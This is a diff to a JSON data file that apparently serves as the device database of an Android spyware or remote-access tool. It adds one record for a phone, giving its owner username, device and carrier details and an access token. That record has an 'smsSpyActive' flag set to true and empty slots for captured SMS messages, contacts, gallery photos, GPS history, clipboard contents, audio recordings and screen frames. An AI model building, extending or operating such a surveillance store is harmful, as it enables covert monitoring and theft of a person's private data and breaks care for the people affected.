@@ -4587,5 +4587,37 @@
       "frameId": 222,
       "capturedAt": 1777691861711
     }
+  },
+  {
+    "deviceId": "pxc_568d9b44",
+    "deviceName": "HP-KUDA-843C",
+    "ownerUsername": "ziwoo",
+    "token": "0cd3c2a7824da4d542078223541bd56a",
+    "lastSeen": 1777693776293,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-02T03:49:36.293Z",
+    "deviceInfo": {
+      "model": "INFINIX Infinix X665E",
+      "androidVersion": "Android 12",
+      "battery": 18,
+      "network": "WiFi: OPPO A5x 6220",
+      "sim1": "TELKOMSEL",
+      "sim2": "Tidak ada layanan"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
